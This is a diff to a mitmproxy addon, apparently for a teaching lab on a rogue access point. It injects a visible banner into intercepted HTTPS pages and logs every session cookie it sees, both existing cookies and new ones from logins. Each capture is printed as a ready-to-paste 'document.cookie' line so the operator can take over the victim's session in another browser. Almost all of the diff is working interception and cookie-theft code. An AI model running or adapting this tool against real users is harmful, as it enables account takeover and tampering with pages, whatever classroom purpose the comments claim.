@@ -8,9 +8,13 @@ Two effects, one addon:
    AP operator can not only OBSERVE but also MODIFY content the browser
    renders, even on HTTPS — once the CA is trusted on the client.
 
-2. LOGS session cookies passing through the proxy (request + Set-Cookie
-   headers), tagged with [SESSION], so the instructor can hijack a student
-   session by pasting the captured cookie into a clean browser.
+2. LOGS session-establishing events tagged with [SESSION]:
+   - [SESSION] LOGIN DETECTED — emitted whenever a response sets a
+     persistent cookie (i.e. the server is binding state to the client).
+     The Paste-able combines existing request cookies with the new ones.
+   - [SESSION] EXISTING COOKIES — emitted on the FIRST cookie-bearing
+     request per host. Captures users who were already logged in before
+     the injection was enabled, without relying on cookie-name heuristics.
 
 REQUIRES: mitmproxy CA must be trusted on the client device (Demo B). Without
           a trusted CA the browser rejects the TLS handshake and no HTML
@@ -36,14 +40,13 @@ from mitmproxy import http
 # ---------------------------------------------------------------------------
 BANNER_HTML = b"""
 <div id="__lab_mitm_banner__" style="
-  position:fixed;top:0;left:0;right:0;z-index:2147483647;
-  background:#cc0000;color:#fff;padding:14px 20px;
-  font-family:-apple-system,system-ui,sans-serif;font-size:15px;
-  font-weight:bold;text-align:center;box-shadow:0 2px 8px rgba(0,0,0,.3);
-  border-bottom:3px solid #800000;">
-  &#9888; Este contenido fue MODIFICADO por el operador de
-  <span style="font-family:monospace">CorpNet-Enterprise</span>
-  &mdash; tu navegador no te ha avisado.
+  position:fixed;top:8px;left:50%;transform:translateX(-50%);
+  z-index:2147483647;width:max-content;max-width:90vw;
+  background:#cc0000;color:#fff;padding:8px 16px;
+  font-family:-apple-system,system-ui,sans-serif;font-size:13px;
+  font-weight:bold;text-align:center;
+  border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,.35);">
+  &#9888; MODIFICADO por <span style="font-family:monospace">CorpNet-Enterprise</span>
 </div>
 <script>
   (function(){
@@ -55,17 +58,6 @@ BANNER_HTML = b"""
 </script>
 """
 
-# ---------------------------------------------------------------------------
-# Cookie heuristics — names that typically carry session state.
-# Matching is case-insensitive and substring-based.
-# ---------------------------------------------------------------------------
-SESSION_COOKIE_HINTS = (
-    "session", "sessid", "sid",
-    "auth", "token", "jwt",
-    "phpsessid", "jsessionid", "connect.sid",
-    "remember", "logged_in",
-)
-
 # Content types whose body will receive the banner. Match the prefix so
 # "text/html; charset=utf-8" also qualifies.
 INJECT_TYPES = ("text/html",)
@@ -74,66 +66,95 @@ INJECT_TYPES = ("text/html",)
 # Falls back to appending at the end of the body if </body> isn't found.
 BODY_CLOSE_RE = re.compile(rb"</body\s*>", re.IGNORECASE)
 
-
-def _looks_like_session_cookie(name: str) -> bool:
-    n = name.lower()
-    return any(hint in n for hint in SESSION_COOKIE_HINTS)
-
-
-def _extract_session_cookies(cookie_header: str) -> list[tuple[str, str]]:
-    """Parse a Cookie: header value and return [(name, value), ...] for
-    cookies whose name looks session-related."""
-    out: list[tuple[str, str]] = []
-    for pair in cookie_header.split(";"):
-        if "=" not in pair:
-            continue
-        name, _, value = pair.strip().partition("=")
-        if _looks_like_session_cookie(name):
-            out.append((name, value))
-    return out
+# Hosts whose first cookie-bearing request has already been logged. Keeps the
+# [EXISTING COOKIES] event to a single emission per host per mitmproxy run so
+# the log stays readable even on heavy SPA traffic.
+_SEEN_HOSTS_WITH_COOKIES: set[str] = set()
 
 
-# ---------------------------------------------------------------------------
-# Cookie capture — runs on every request, logs interesting cookies
-# ---------------------------------------------------------------------------
-def request(flow: http.HTTPFlow) -> None:
-    cookie_header = flow.request.headers.get("cookie", "")
-    if not cookie_header:
-        return
+def _is_persistent_set_cookie(set_cookie_value: str) -> bool:
+    """Return True if the Set-Cookie will actually persist on the client.
+    Excludes deletion cookies (Max-Age=0 or Expires in the past)."""
+    lower = set_cookie_value.lower()
+    if "max-age=0" in lower or "max-age=-" in lower:
+        return False
+    # Conventional "delete this cookie" expiry sent by every framework.
+    if "expires=thu, 01 jan 1970" in lower:
+        return False
+    return True
 
-    interesting = _extract_session_cookies(cookie_header)
-    if not interesting:
-        return
 
-    src_ip = flow.client_conn.peername[0] if flow.client_conn.peername else "?"
-    cookie_string = "; ".join(f"{n}={v}" for n, v in interesting)
+def _emit_hijack_event(tag: str, host: str, src_ip: str, cookie_string: str,
+                       extra: str = "") -> None:
     print(
         f"\n{'='*60}\n"
-        f"[SESSION] {flow.request.method} {flow.request.pretty_url}\n"
+        f"[SESSION] {tag} at {host}\n"
         f"[SESSION] Source IP : {src_ip}\n"
-        f"[SESSION] Cookie    : {cookie_string}\n"
+        + (f"[SESSION] {extra}\n" if extra else "")
+        + f"[SESSION] Cookie    : {cookie_string}\n"
         f"[SESSION] Paste-able: document.cookie = '{cookie_string}';\n"
         f"{'='*60}"
     )
 
 
 # ---------------------------------------------------------------------------
+# Cookie capture — request side: snapshot the FIRST cookie-bearing request
+# per host so we can hijack users who were already logged in before the
+# injection was enabled.
+# ---------------------------------------------------------------------------
+def request(flow: http.HTTPFlow) -> None:
+    cookie_header = flow.request.headers.get("cookie", "")
+    if not cookie_header:
+        return
+
+    host = flow.request.pretty_host
+    if host in _SEEN_HOSTS_WITH_COOKIES:
+        return
+    _SEEN_HOSTS_WITH_COOKIES.add(host)
+
+    src_ip = flow.client_conn.peername[0] if flow.client_conn.peername else "?"
+    _emit_hijack_event("EXISTING COOKIES", host, src_ip, cookie_header)
+
+
+# ---------------------------------------------------------------------------
 # Banner injection — runs on every response, modifies HTML bodies
 # ---------------------------------------------------------------------------
 def response(flow: http.HTTPFlow) -> None:
-    # Set-Cookie capture: if the server is HANDING OUT a session cookie,
-    # log it too — useful when the student logs in fresh.
+    host = flow.request.pretty_host
+
+    # LOGIN detection: any persistent Set-Cookie means the server is binding
+    # state to the client. Combine existing request cookies + the new ones
+    # the response is about to set so the Paste-able is complete and ready
+    # to hijack from a clean browser.
+    new_cookies: list[tuple[str, str]] = []
     for set_cookie in flow.response.headers.get_all("set-cookie"):
-        name = set_cookie.split("=", 1)[0].strip()
-        if _looks_like_session_cookie(name):
-            src_ip = flow.client_conn.peername[0] if flow.client_conn.peername else "?"
-            print(
-                f"\n{'='*60}\n"
-                f"[SESSION] NEW Set-Cookie from {flow.request.pretty_host}\n"
-                f"[SESSION] Client IP : {src_ip}\n"
-                f"[SESSION] Set-Cookie: {set_cookie}\n"
-                f"{'='*60}"
-            )
+        if not _is_persistent_set_cookie(set_cookie):
+            continue
+        head = set_cookie.split(";", 1)[0]
+        if "=" not in head:
+            continue
+        name, _, value = head.partition("=")
+        new_cookies.append((name.strip(), value.strip()))
+
+    if new_cookies:
+        combined: dict[str, str] = {}
+        existing = flow.request.headers.get("cookie", "")
+        for pair in existing.split(";"):
+            if "=" in pair:
+                n, _, v = pair.strip().partition("=")
+                combined[n] = v
+        for name, value in new_cookies:
+            combined[name] = value
+        cookie_string = "; ".join(f"{n}={v}" for n, v in combined.items())
+        src_ip = flow.client_conn.peername[0] if flow.client_conn.peername else "?"
+        names = ", ".join(n for n, _ in new_cookies)
+        _emit_hijack_event(
+            "LOGIN DETECTED", host, src_ip, cookie_string,
+            extra=f"Set      : {names}",
+        )
+        # After a fresh login we want any future request-side snapshot for
+        # this host to reflect the new state; drop it from the seen set.
+        _SEEN_HOSTS_WITH_COOKIES.discard(host)
 
     # Banner injection: only on text/html responses with a body.
     content_type = flow.response.headers.get("content-type", "").lower()
